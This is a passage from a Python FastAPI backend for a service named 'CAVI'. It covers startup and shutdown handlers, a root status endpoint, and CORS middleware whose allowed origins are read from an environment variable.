    asyncio.create_task(roi_scheduler())
    logger.info("CAVI backend started")

@app.on_event("shutdown")
async def shutdown():
    client.close()

@api.get("/")
async def root():
    return {"message": "CAVI API online"}

app.include_router(api)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=False,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)
